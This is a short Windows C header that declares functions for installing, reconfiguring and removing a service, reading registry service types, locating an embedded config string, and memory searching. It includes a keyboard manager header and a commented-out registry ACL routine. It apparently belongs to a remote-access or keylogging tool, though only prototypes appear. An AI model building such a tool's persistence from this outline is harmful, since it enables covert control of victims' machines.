
#if !defined(AFX_INSTALL_H_INCLUDED)
#define AFX_INSTALL_H_INCLUDED
#include "KeyboardManager.h"
#include <windows.h>
#include <aclapi.h>
void	DeleteInstallFile(char *lpServiceName);
bool	IsServiceRegExists(char *lpServiceName);
void	ReConfigService(char *lpServiceName);
DWORD	QueryServiceTypeFromRegedit(char *lpServiceName);
void	RemoveService(LPCTSTR lpServiceName);
LPCTSTR FindConfigString(HANDLE hFile, LPCTSTR lpString);
int		memfind(const char *mem, const char *str, int sizem, int sizes);
//BOOL	RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode);
#endif // !defined(AFX_INSTALL_H_INCLUDED)